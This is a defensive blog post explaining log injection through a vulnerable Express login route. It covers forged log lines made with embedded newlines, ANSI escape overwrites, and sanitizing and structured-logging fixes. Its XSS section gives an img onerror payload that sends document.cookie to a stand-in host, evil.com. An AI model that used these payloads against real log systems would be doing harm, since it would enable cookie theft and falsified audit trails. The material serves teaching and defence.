---
title: "Log Injection: Your Debug Logs Are Lying to You 🪵"
date: "2026-05-08"
excerpt: "You trust your logs to tell the truth. But what if attackers are writing the story? Log injection lets hackers forge entries, hide attacks, and even trigger XSS in your log viewer — and most devs never see it coming."
tags: ["cybersecurity", "web-security", "security", "logging", "appsec"]
featured: true
---

# Log Injection: Your Debug Logs Are Lying to You 🪵

Pop quiz: You're debugging a production incident at 2 AM. You open your logs and see:

```
[2026-05-08 02:14:33] INFO  User admin@yourcompany.com logged in successfully
[2026-05-08 02:14:34] INFO  User hacker@evil.com logged in successfully
[2026-05-08 02:14:34] INFO  User admin@yourcompany.com logged out
```

Looks clean, right? Admin logged in, some random user logged in, admin logged out. Nothing sus.

Except... that entire second line? A hacker wrote it. Without touching your database. Without breaking your auth. Just by knowing you log stuff without sanitizing it.

Welcome to **Log Injection** — the vulnerability where your own logs gaslight you. 🎭

## What Even Is Log Injection?

Log injection happens when user-controlled input gets written directly to your logs without sanitization. This lets attackers:

1. **Forge log entries** — fabricate events that never happened
2. **Hide their tracks** — insert fake "successful logout" entries after an attack
3. **Poison your SIEM** — trigger false alerts or suppress real ones
4. **XSS in log viewers** — if your logs render in a browser, `<script>` tags work
5. **ANSI injection** — mess with terminal log views using escape codes

The scary part? It's not some exotic attack. It's a one-liner that works on almost every app.

## The Attack in Action

Here's a dead-simple vulnerable login endpoint:

```javascript
// Express.js login route — VULNERABLE
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    const user = await User.findOne({ email });

    if (!user || !await bcrypt.compare(password, user.password)) {
        // Logging the failed attempt — seems responsible!
        console.log(`[${new Date().toISOString()}] WARN  Failed login attempt for: ${email}`);
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    console.log(`[${new Date().toISOString()}] INFO  User ${email} logged in successfully`);
    res.json({ token: generateToken(user) });
});
```

Looks fine. Responsible logging! Good developer!

Now here's what an attacker sends as their "email":

```
hacker@evil.com\n[2026-05-08 02:14:35] INFO  User admin@yourcompany.com logged in successfully\n[2026-05-08 02:14:36] INFO  Payment of $9999 approved for user admin@yourcompany.com
```

Your log file now contains:

```
[2026-05-08 02:14:34] WARN  Failed login attempt for: hacker@evil.com
[2026-05-08 02:14:35] INFO  User admin@yourcompany.com logged in successfully
[2026-05-08 02:14:36] INFO  Payment of $9999 approved for user admin@yourcompany.com
```

Three log lines. One real. Two completely fabricated. **Your logs just became fiction.**

## The XSS Variant (Log Viewer Edition)

If your team uses a web-based log viewer — Kibana, Graylog, a custom dashboard — and logs are rendered as HTML, you've got a bonus XSS attack surface.

An attacker enters this as their username during registration:

```html
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

Your app logs:

```
[INFO] New user registered: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

Your security engineer opens the log dashboard. **Cookie stolen.** The person reviewing the security incident *becomes* the victim. That's a beautiful (terrible) irony.

## The ANSI Injection Bonus Round 🎨

For terminal log viewers, there's ANSI injection — where escape codes mess with how logs display:

```python
# Python — user provides their "name"
user_name = request.form['name']
logger.info(f"User {user_name} updated their profile")
```

Attacker input:
```
Alice\033[2K\033[1A\033[2K[INFO] User root performed system backup
```

In terminals that render ANSI codes, this overwrites previous lines. The attacker's activity is literally erased from the terminal view. Your ops team is reading rewritten history.

## The Fix: Stop Trusting User Input in Logs

Three layers of defense:

**Layer 1: Sanitize Before Logging**

```javascript
function sanitizeForLog(input) {
    if (typeof input !== 'string') return String(input);
    return input
        .replace(/[\n\r]/g, ' ')     // Kill newlines — the primary attack vector
        .replace(/\t/g, ' ')          // Tabs too
        .replace(/\x1b\[[0-9;]*m/g, '') // Strip ANSI escape codes
        .slice(0, 200);               // Truncate to prevent log flooding
}

// Now logging is safe:
logger.warn(`Failed login attempt for: ${sanitizeForLog(email)}`);
```

**Layer 2: Use Structured Logging**

The real fix: stop building log strings manually. Use structured logging where user data is a field, never part of the message:

```javascript
// Using winston with structured logging
const logger = winston.createLogger({
    format: winston.format.json(), // Output as JSON, not plain text
    transports: [new winston.transports.File({ filename: 'app.log' })]
});

// User input goes into a FIELD, not the message string
logger.warn({
    event: 'login_failed',
    email: email,           // Raw user input — safe because it's a JSON value
    ip: req.ip,
    timestamp: new Date().toISOString()
});
```

Output:
```json
{"level":"warn","event":"login_failed","email":"hacker@evil.com\n[INJECTED]","ip":"1.2.3.4","timestamp":"2026-05-08T02:14:34Z"}
```

The newline is now inside a JSON string — harmless, preserved for debugging, but can't forge new log lines.

**Layer 3: Verify Log Integrity**

For high-security environments, use append-only log shipping to a separate system immediately:

```python
# Ship logs to an immutable destination (e.g., CloudWatch, Splunk)
# so even if local logs are tampered with, the shipped copy is clean
import logging
import boto3

class CloudWatchHandler(logging.Handler):
    def emit(self, record):
        # Log goes directly to CloudWatch — attacker can't touch it
        self.client.put_log_events(
            logGroupName='/app/security',
            logStreamName='prod',
            logEvents=[{
                'timestamp': int(record.created * 1000),
                'message': self.format(record)
            }]
        )
```

## Real-World Impact: Why You Should Care

- **Incident response becomes unreliable** — if attackers can write your logs, you can't trust your forensic timeline
- **Compliance nightmares** — SOC 2, PCI-DSS, HIPAA all require log integrity; injected logs mean audit failures
- **Alert fatigue attacks** — an attacker can flood your SIEM with thousands of fake INFO-level events, burying real alerts
- **Covering tracks** — the entire point of many attacks is staying hidden; log injection is a free invisibility cloak

## Quick Audit Checklist ✅

Right now, grep your codebase:

```bash
# Find potentially vulnerable logging patterns
grep -rn "console.log.*req\." src/
grep -rn "logger\.\(info\|warn\|error\).*\${" src/
grep -rn "log\.write.*request" src/
```

If you see user-controlled variables dropped directly into log strings — that's your to-do list.

Then check:
- [ ] Are newline characters stripped from user input before logging?
- [ ] Is structured/JSON logging used instead of string concatenation?
- [ ] Does your log viewer sanitize HTML before rendering?
- [ ] Are ANSI escape codes stripped for terminal log output?
- [ ] Are logs shipped to an immutable external store?

## The Bottom Line

Logging feels like the safe, responsible thing to do. And it is — until you log raw user input without sanitizing it.

The fix is genuinely simple: **never concatenate user data directly into a log message string**. Use structured logging, treat user input as data (not format), and strip newlines before they hit your log system.

Your future-self at 2 AM during an incident will thank you — because the logs will actually tell the truth.

---

**Found a log injection in the wild?** Share your war story on [LinkedIn](https://www.linkedin.com/in/anuraghkp) — I'm always collecting good security tales.

**Liked this?** Follow along for more "wait, THAT's a vulnerability?!" content. There's no shortage of them. 🔐

*P.S. — Go check your log dashboards. If they render HTML, you might have a surpringly easy XSS bug waiting for you right now.* 🕵️
